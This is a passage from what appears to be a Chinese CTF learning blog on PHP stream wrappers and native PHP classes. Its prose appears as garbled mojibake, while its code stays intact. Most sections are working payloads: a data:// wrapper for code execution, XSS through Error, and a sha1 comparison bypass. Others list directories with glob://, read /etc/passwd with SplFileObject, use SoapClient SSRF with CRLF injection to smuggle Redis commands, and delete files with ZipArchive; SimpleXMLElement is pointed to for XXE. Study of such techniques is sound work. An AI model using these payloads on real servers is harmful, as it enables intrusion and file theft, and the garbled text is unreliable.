<li><p>convert.quoted-printable-decode#å°† quoted-printable å­—ç¬¦ä¸²è½¬æ¢ä¸º 8-bit å­—ç¬¦ä¸²</p>
</li>
<li><p>convert.iconv</p>
<blockquote>
<p>åœ¨æ¿€æ´» <a href="https://www.php.net/manual/zh/book.iconv.php">iconv</a> çš„å‰æä¸‹å¯ä»¥ä½¿ç”¨ <code>convert.iconv.*</code> å‹ç¼©è¿‡æ»¤å™¨ï¼Œ ç­‰åŒäºç”¨ <a href="https://www.php.net/manual/zh/function.iconv.php">iconv()</a> å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ è¯¥è¿‡æ»¤å™¨ä¸æ”¯æŒå‚æ•°ï¼Œä½†å¯ä½¿ç”¨è¾“å…¥&#x2F;è¾“å‡ºçš„ç¼–ç åç§°ï¼Œç»„æˆè¿‡æ»¤å™¨åç§°ï¼Œæ¯”å¦‚ <code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code> æˆ– <code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code> </p>
</blockquote>
<p>ç”¨æ³•å¦‚ä¸Šï¼Œå½“rotæˆ–è€…baseè¢«bançš„æ—¶å€™å¯ä»¥é€šè¿‡ä¿®æ”¹å­—ç¬¦ç¼–ç çš„å½¢å¼æ‰¾å‡ºæ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼<code>php://filter/convert.iconv..UCS-2LE/resource=</code>çš„æ–¹å¼å¼¹å‡ºæ–‡ä»¶å†…å®¹</p>
</li>
</ul>
<p>å‹ç¼©è¿‡æ»¤å™¨</p>
<ul>
<li><p>zlib.deflateå’Œ zlib.inflate # zlib.deflateæ˜¯ç”¨zlibè¿›è¡Œæ–‡ä»¶æµåŠ å¯†ã€‚zlib.inflateæ˜¯ç”¨zlibè¿›è¡Œæ–‡ä»¶æµè§£å¯†</p>
</li>
<li><p>bzip2.compresså’Œ bzip2.decompress # åŒä¸Š</p>
</li>
</ul>
<h1 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</h1><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€å</p>
<p>zip:&#x2F;&#x2F; å¤„ç†çš„æ˜¯<code>.zip</code>åç¼€çš„å‹ç¼©åŒ…ï¼Œcompress.zlib:&#x2F;&#x2F; å¤„ç†çš„æ˜¯<code>.gz</code>åç¼€çš„å‹ç¼©åŒ…ï¼Œcompress.bzip2:&#x2F;&#x2F; å¤„ç†çš„æ˜¯<code>.bz2</code>åç¼€çš„å‹ç¼©åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://archive.zip#dir/file.txt</span><br><span class="line">å³zip:// [å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]**è¦ç”¨ç»å¯¹è·¯å¾„+urlç¼–ç #</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip2:///etc/www/html/file.bz2</span><br><span class="line">ä¹Ÿå¯ä»¥ç›¸å¯¹è·¯å¾„</span><br><span class="line">compress.bzip2://./file.bz2 #zlibåŒç†</span><br></pre></td></tr></table></figure>

<h1 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h1><p>data:&#x2F;&#x2F;èµ„æºç±»å‹;ç¼–ç ,å†…å®¹ ï¼ˆdata:&#x2F;&#x2F;ä¹Ÿå¯ä»¥å†™æˆdata:ï¼‰</p>
<p>data:&#x2F;&#x2F;åè®®é€šè¿‡æ‰§è¡Œèµ„æºç±»å‹,ä½¿åé¢çš„å†…å®¹å½“åšæ–‡ä»¶å†…å®¹æ¥æ‰§è¡Œ,ä»è€Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="glob-x2F-x2F"><a href="#glob-x2F-x2F" class="headerlink" title="glob:&#x2F;&#x2F;"></a>glob:&#x2F;&#x2F;</h1><p>æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ï¼Œéœ€è¦æ­é…DirectoryIteratorç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob://[æ–‡ä»¶è·¯å¾„]/[æ–‡ä»¶å].[æ–‡ä»¶åç¼€]</span><br><span class="line"></span><br><span class="line">$it = new DirectoryIterator($_GET[&#x27;file&#x27;]);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line"> printf(&quot;%s&quot;, $f-&gt;getFilename());</span><br><span class="line">	echo&#x27;&lt;/br&gt;&#x27;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h1><p>å’Œzipç±»ä¼¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://./php.zip/php.txt</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPåŸç”Ÿç±»</title>
    <url>/2023/09/22/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¯¹äºåŸç”Ÿç±»çš„æ¥è§¦ä¸»è¦æ˜¯åœ¨ctfshowèœé¸Ÿæ¯ä¸Šçš„ä¸€é“é¢˜ï¼Œå¸ˆå‚…ç”¨åŸç”Ÿç±»ä¸¤æ­¥å°±ç§’äº†ï¼Œæˆ‘è¿˜åœ¨æ¥å›æŠ˜è…¾ã€‚æ‰€ä»¥è®°å½•ä¸€ä¸‹åœ¨ç½‘ä¸Šçœ‹åˆ°çš„å¯åˆ©ç”¨çš„åŸç”Ÿç±»ã€‚</p>
<p>åŸç”Ÿç±»ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è‡ªå¸¦çš„ç±»ï¼Œä¸éœ€è¦äº‹å‰è¿›è¡Œclasså®šä¹‰ã€‚</p>
<p>åœ¨ISCC2022webé¢˜æœ‰ä¸ªå°±æ˜¯å…¸å‹çš„åŸç”Ÿç±»åˆ©ç”¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172321849.png" alt="image-20230417232054784"></p>
<p>å…¶ä¸­newçš„ç±»å’Œå‘ç±»ä¸­ä¼ é€’çš„å‚æ•°éƒ½å¯ä»¥è‡ªå®šä¹‰ï¼Œå°±éšä¾¿ç”¨åŸç”Ÿç±»</p>
<h1 id="åŸç”Ÿç±»"><a href="#åŸç”Ÿç±»" class="headerlink" title="åŸç”Ÿç±»"></a>åŸç”Ÿç±»</h1><h2 id="Error-x2F-Exception"><a href="#Error-x2F-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>è¿™ä¸¤ä¸ªç±»ä¸­éƒ½å†…ç½®äº†__toString()æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;test&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>å½“æ‰§è¡Œæ—¶ï¼Œä¼šè¾“å‡ºè¯¥â€œtestâ€</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172331089.png" alt="image-20230417233124069"></p>
<p>è€Œè¿™ä¸ªtestæ˜¯ç›´æ¥æ‹¼æ¥åˆ°ç½‘é¡µä¸­çš„ï¼Œé‚£å°±æœ‰xssæ”»å‡»ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œä¼šæŠŠ<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>ç›´æ¥æ‹¼æ¥åˆ°htmlä¸­ï¼Œé€ æˆxssæ”»å‡»</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172333969.png" alt="image-20230417233325942"></p>
<p>ç¡®å®æ˜¯å½“æˆè„šæœ¬è§£æäº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172334701.png" alt="image-20230417233451683"></p>
<h3 id="ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä½¿ç”¨ç±»ä¸­çš„__toString()æ–¹æ³•æ—¶ï¼Œå‘Errorä¸­ä¼ å…¥çš„1å¹¶ä¸ä¼šæ˜¾ç¤ºï¼Œè¿™è¯´æ˜åœ¨å­—ç¬¦ä¸²æ“ä½œæ—¶å€™ï¼Œåªè¦ä¼ å…¥çš„â€œpayloadâ€ç›¸åŒï¼Œå³è§†ä¸ºè¯¥<strong>å­—ç¬¦ä¸²</strong>ç›¸åŒã€‚</p>
<p>ä½†ä¸åŒçš„ä¸¤ä¸ªç±»æœ¬è´¨ä¸Šæ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™æ ·è¯´å¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ¥çœ‹ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);</span><br><span class="line">echo $a . $b;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼ŒæŠŠ$aå’Œ$bæ”¾åœ¨åŒä¸€è¡Œå®šä¹‰æ‰èƒ½ä¿è¯echoå‡ºæ¥çš„å†…å®¹ä¸€è‡´ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: payload in /home/kali/index.php:2 Stack trace: #0 &#123;main&#125;Error: payload in /home/kali/index.php:2 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>å¯è§ï¼Œä¸¤è€…çš„å­—ç¬¦ä¸²æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œä½†æ˜¯è¿›è¡Œvar_dumpæ¯”å¯¹æ—¶ï¼Œä¸¤è€…çš„å€¼å´ä¸ç›¸åŒã€‚</p>
<p>è¿™å°±è®©æˆ‘æƒ³èµ·æ¥ä¹‹å‰å­¦é•¿å¸ƒç½®è¿‡çš„ä¸€ä¸ªrceï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((string)$_POST[&#x27;a&#x27;] != (string)$_POST[&#x27;b&#x27;] &amp;&amp; sha1($_POST[&#x27;a&#x27;]) === sha1($_POST[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure>

<p>å¾ˆä¸å·§ï¼Œè¿™é‡Œæ˜¯ç”¨postæ–¹æ³•æ¥æ”¶å€¼ï¼Œè€Œä¸”è¿›è¡Œäº†stringè½¬æ¢ï¼Œè€Œè½¬æ¢ä¹‹åçš„å€¼å°±ä¸€æ ·äº†ï¼Œæ‰€ä»¥æ²¡æ³•ç”¨è¿™ä¸ªæ–¹æ³•è§£ï¼Œå­¦é•¿ç»™å‡ºæ¥çš„wpæ˜¯ç”¨è¯»å–æ¶æ„æ„é€ çš„pdfæ–‡ä»¶ä»¥ç»•è¿‡ã€‚</p>
<p>ä½†æ˜¯å¦‚æœæ¢ä¸ªé¢˜ï¼ŒæŠŠåº”ç”¨åœºæ™¯æ¢åœ¨ç±»ä¸­æ¯”è¾ƒï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($this-&gt;a != $this-&gt;b &amp;&amp; sha1($this-&gt;a) === sha1($this-&gt;b))</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å°±å¯ä»¥ç”¨åŸç”Ÿç±»ç»•è¿‡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;a = new Error(&quot;payload&quot;,1);$this-&gt;b = new Error(&quot;payload&quot;,2);</span><br></pre></td></tr></table></figure>

<h2 id="Directorylterator-x2F-Filesystemlterator"><a href="#Directorylterator-x2F-Filesystemlterator" class="headerlink" title="Directorylterator&#x2F;Filesystemlterator"></a>Directorylterator&#x2F;Filesystemlterator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥<code>/?whoami=glob:///*</code>å³å¯æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p>
<p>å¦‚æœä¸ç”¨foreachå°±åªèƒ½æŸ¥çœ‹ç¬¬ä¸€ä¸ª</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181239835.png" alt="image-20230418123910771"></p>
<p>Filesystemlteratorå’ŒDirectoryIteratorçš„ä¸åŒæ˜¯ï¼šFilesystemlteratorè¿”å›çš„æ˜¯ä»¥ç»å¯¹è·¯å¾„æ˜¾ç¤ºï¼Œè€ŒDirectoryIteratorä»…æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹</p>
<h2 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h2><p>è¿™ä¸ªç±»ä¸å‰ä¸¤ä¸ªç±»ä¼¼ï¼Œä¸è¿‡è¿™ä¸ªæŸ¥æ‰¾æ–‡ä»¶æ—¶ä¸éœ€è¦æ­é…<code>glob://</code>ä¼ªåè®®ä½¿ç”¨ï¼Œç›´æ¥ä¼ å…¥è·¯å¾„å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = &quot;/*&quot;;</span><br><span class="line">$a = new GlobIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181240938.png" alt="image-20230418124020916"></p>
<h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>å¯ä»¥åˆ©ç”¨è¯¥ç±»è¯»å–æ–‡ä»¶çš„ä¸€è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">echo $context;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¹Ÿåªèƒ½è¯»ä¸€è¡Œï¼Œå¦‚æœè¦å…¨éƒ¨è¯»å–è¦åŠ foreachéå†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">foreach($context as $f)&#123;</span><br><span class="line">    echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>SoapClientç±»ä¸­å†…ç½®äº†ä¸€ä¸ª__callæ–¹æ³•ï¼Œè§¦å‘è¯¥æ–¹æ³•ä¹‹åå¯ä»¥å‘é€httpå’Œhttpsè¯·æ±‚ã€‚è¿™ä¸ªä¹Ÿå¯ä»¥è¢«è¿ç”¨åœ¨ssrfä¸­ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [,array $options ])</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</p>
<p>åˆ™å¯ä»¥æ„é€ ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://192.168.255.129:1234/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://192.168.255.129:1234&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨192.168.255.129ä¸Šç»™ä¸€ä¸ª1234çš„ç›‘å¬ï¼Œå¯ä»¥æ¥æ”¶åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /aaa HTTP/1.1</span><br><span class="line">Host: 192.168.255.129:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/8.2.0</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;http://192.168.255.129:1234#a&quot;</span><br><span class="line">Content-Length: 388</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://192.168.255.129:1234&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœHTTPå¤´å­˜åœ¨CRLFæ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡SSRF+CRLFæ’å…¥ä»»æ„HTTPå¤´ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCookie: PHPSESSID=test&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ’å…¥cookieï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.255.129:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: WHOAMI</span><br><span class="line">Cookie: PHPSESSID=test</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;test#a&quot;</span><br><span class="line">Content-Length: 365</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åŒç†ï¼Œè¿˜å¯ä»¥æ’å…¥Rediså‘½ä»¤:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCONFIG SET dir /var/www/html&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥å‘é€POSTæ•°æ®åŒ…ï¼Œä½†æ˜¯è¦è®¾ç½®<code>Content-Type</code>ä¸º<code>application/x-www-form-urlencoded</code>ã€‚</p>
<p>ç”±äº<code>Content-Type</code>çš„ä½ç½®åœ¨UAåº•ä¸‹ï¼Œå°±å¯ä»¥é€šè¿‡ç±»ä¸­çš„UAæ’å…¥<code>Content-Type</code>ï¼ŒæŠŠåŸæ¥çš„æŒ¤åˆ°åº•ä¸‹ä½œä¸ºPOSTå†…å®¹</p>
<p>æŠ„çš„ä¸€ä»½payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$poc = &quot;CONFIG SET dir /var/www/html&quot;;</span><br><span class="line">$post_data = &#x27;data=whoami&#x27;;</span><br><span class="line">$headers = array(</span><br><span class="line">    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,</span><br><span class="line">    &#x27;Cookie: PHPSESSID=Cookie&#x27;</span><br><span class="line">);</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&quot;UA\n\rContent-Type: application/x-www-form-urlencoded\n\r&quot;.join(&quot;\n\r&quot;,$headers).&quot;\n\rContent-Length: &quot;. (string)strlen($post_data).&quot;\n\r\n\r&quot;.$post_data,&#x27;uri&#x27;=&gt;&#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿”å›çš„ç»“æœï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181456858.png" alt="image-20230418145614812"></p>
<p>æˆåŠŸä¼ å…¥äº†POSTå†…å®¹ã€‚</p>
<h2 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h2><p>ç±»ä¸‹æœ‰ä¸ªopenæ–¹æ³•ï¼Œå¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipæ–‡æ¡£è¿›è¡Œè¯»å–.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</span><br></pre></td></tr></table></figure>

<p>flagså¯ä»¥æŒ‡å®šå¼€æ‰“çš„æ¨¡å¼ï¼š</p>
<ul>
<li><p><code>ZipArchive::OVERWRITE</code>ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚</p>
</li>
<li><p><code>ZipArchive::CREATE</code>ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</p>
</li>
<li><p><code>ZipArchive::RDONLY</code>ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚</p>
</li>
<li><p><code>ZipArchive::EXCL</code>ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</p>
</li>
<li><p><code>ZipArchive::CHECKCONS</code>ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</p>
</li>
</ul>
<p>å¦‚æœæŒ‡å®šflagsä¸º<code>ZipArchive::OVERWRITE</code>ï¼Œå°±å¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new ZipArchive();</span><br><span class="line">$a-&gt;open(&#x27;1.txt&#x27;,ZipArchive::OVERWRITE); </span><br></pre></td></tr></table></figure>

<p>ç”±äºæ²¡æœ‰ä¿å­˜ï¼Œæ‰€ä»¥æœ€åçš„æ•ˆæœå°±æ˜¯æŠŠ1.txtåˆ é™¤</p>
<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>è¿™ä¸ªç±»ç”¨äºè§£æXMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚</p>
<p>å®˜æ–¹æ–‡æ¡£ä¸­å¯¹äºSimpleXMLElement ç±»çš„æ„é€ æ–¹æ³• <code>SimpleXMLElement::__construct</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public SimpleXMLElement::__construct(</span><br><span class="line">    string $data,</span><br><span class="line">    int $options = 0,</span><br><span class="line">    bool $dataIsURL = false,</span><br><span class="line">    string $namespaceOrPrefix = &quot;&quot;,</span><br><span class="line">    bool $isPrefix = false</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>$data</code>ï¼šæ ¼å¼æ­£ç¡®çš„XMLå­—ç¬¦ä¸²ï¼Œæˆ–è€…XMLæ–‡æ¡£çš„è·¯å¾„æˆ–URLï¼ˆå¦‚æœ<code>$data_is_url</code>ä¸ºtrueï¼‰ã€‚</p>
<p><code>$data_is_url</code>ï¼šé»˜è®¤æƒ…å†µä¸‹<code>$data_is_url</code>ä¸ºfalseã€‚ä½¿ç”¨trueæŒ‡å®š<code>$data</code>çš„è·¯å¾„æˆ–URLåˆ°ä¸€ä¸ªXMLæ–‡ä»¶ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²æ•°æ®ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°é€šè¿‡è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° <code>$data_is_url</code> ä¸º <code>true</code>ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥ã€‚ç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„urlã€‚</p>
<p>å½“å¯ä»¥æ§åˆ¶ç›®æ ‡çš„è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªç±»è¿›è¡ŒXXEæ”»å‡»ã€‚</p>
<p>æ”»å‡»çš„æ‰‹æ³•ï¼š</p>
<p><a href="https://xz.aliyun.com/t/3357">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
